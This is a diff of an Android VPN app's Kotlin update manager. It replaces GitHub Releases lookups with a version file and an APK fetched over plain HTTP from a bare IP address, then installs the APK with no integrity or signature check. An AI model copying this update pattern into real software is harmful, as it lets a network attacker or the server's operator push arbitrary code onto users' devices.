@@ -16,17 +16,14 @@ import org.json.JSONObject
 import java.io.File
 import java.net.URL
 
-/**
- * In-App Update Manager for StealthLink VPN
- * Downloads updates from GitHub Releases
- */
 class UpdateManager(private val context: Context) {
-    
+
     companion object {
         private const val TAG = "UpdateManager"
-        private const val GITHUB_RELEASES_API = "https://api.github.com/repos/infernal557721-crypto/stealthlink-vpn-android/releases/latest"
+        private const val VERSION_URL = "http://81.200.154.49/download/version.json"
+        private const val APK_DIRECT_URL = "http://81.200.154.49/download/vpncode.apk"
     }
-    
+
     data class UpdateInfo(
         val versionName: String,
         val versionCode: Int,
@@ -34,42 +31,25 @@ class UpdateManager(private val context: Context) {
         val releaseNotes: String,
         val hasUpdate: Boolean
     )
-    
-    /**
-     * Check for updates from GitHub Releases
-     */
+
     suspend fun checkForUpdate(): UpdateInfo = withContext(Dispatchers.IO) {
         try {
-            val response = URL(GITHUB_RELEASES_API).readText()
+            val response = URL(VERSION_URL).readText()
             val json = JSONObject(response)
-            
-            val latestVersion = json.getString("tag_name").removePrefix("v")
-            val releaseNotes = json.optString("body", "")
-            
-            // Parse version code from tag (e.g., "1.0.1" -> 101)
-            val latestVersionCode = parseVersionCode(latestVersion)
-            // Parse CURRENT version name too, to be consistent with tag parsing
+
+            val latestVersion = json.getString("version")
+            val latestVersionCode = json.getInt("versionCode")
+
             val currentVersionName = getCurrentVersionName()
             val currentVersionCode = parseVersionCode(currentVersionName)
-            
-            // Find APK asset download URL
-            val assets = json.getJSONArray("assets")
-            var downloadUrl = ""
-            for (i in 0 until assets.length()) {
-                val asset = assets.getJSONObject(i)
-                if (asset.getString("name").endsWith(".apk")) {
-                    downloadUrl = asset.getString("browser_download_url")
-                    break
-                }
-            }
-            
-            Log.d(TAG, "Current: $currentVersionCode, Latest: $latestVersionCode")
-            
+
+            Log.d(TAG, "Current: $currentVersionCode ($currentVersionName), Latest: $latestVersionCode ($latestVersion)")
+
             UpdateInfo(
                 versionName = latestVersion,
                 versionCode = latestVersionCode,
-                downloadUrl = downloadUrl,
-                releaseNotes = releaseNotes,
+                downloadUrl = APK_DIRECT_URL,
+                releaseNotes = "",
                 hasUpdate = latestVersionCode > currentVersionCode
             )
         } catch (e: Exception) {
@@ -77,18 +57,14 @@ class UpdateManager(private val context: Context) {
             UpdateInfo("", 0, "", "", false)
         }
     }
-    
-    /**
-     * Download and install update
-     */
+
     fun downloadAndInstall(downloadUrl: String, onProgress: (Int) -> Unit, onComplete: () -> Unit) {
         val fileName = "vpncode-update.apk"
         val downloadDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
         val file = File(downloadDir, fileName)
-        
-        // Delete old file if exists
+
         if (file.exists()) file.delete()
-        
+
         val request = DownloadManager.Request(Uri.parse(downloadUrl))
             .setTitle("VpnCode Update")
             .setDescription("Скачивание обновления...")
@@ -96,11 +72,10 @@ class UpdateManager(private val context: Context) {
             .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
             .setAllowedOverMetered(true)
             .setAllowedOverRoaming(true)
-        
+
         val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
         val downloadId = downloadManager.enqueue(request)
-        
-        // Register receiver for download complete
+
         val receiver = object : BroadcastReceiver() {
             override fun onReceive(ctx: Context?, intent: Intent?) {
                 val id = intent?.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1) ?: -1
@@ -111,17 +86,14 @@ class UpdateManager(private val context: Context) {
                 }
             }
         }
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE), Context.RECEIVER_EXPORTED)
         } else {
             context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE))
         }
     }
-    
-    /**
-     * Install APK file
-     */
+
     private fun installApk(file: File) {
         try {
             val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -129,7 +101,6 @@ class UpdateManager(private val context: Context) {
             } else {
                 Uri.fromFile(file)
             }
-            
             val intent = Intent(Intent.ACTION_VIEW).apply {
                 setDataAndType(uri, "application/vnd.android.package-archive")
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
@@ -139,16 +110,15 @@ class UpdateManager(private val context: Context) {
             Log.e(TAG, "Failed to install APK", e)
         }
     }
-    
+
     private fun getCurrentVersionName(): String {
         return try {
-            val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
-            pInfo.versionName
+            context.packageManager.getPackageInfo(context.packageName, 0).versionName
         } catch (e: Exception) {
             "1.0.0"
         }
     }
-    
+
     private fun parseVersionCode(version: String): Int {
         return try {
             val parts = version.split(".")
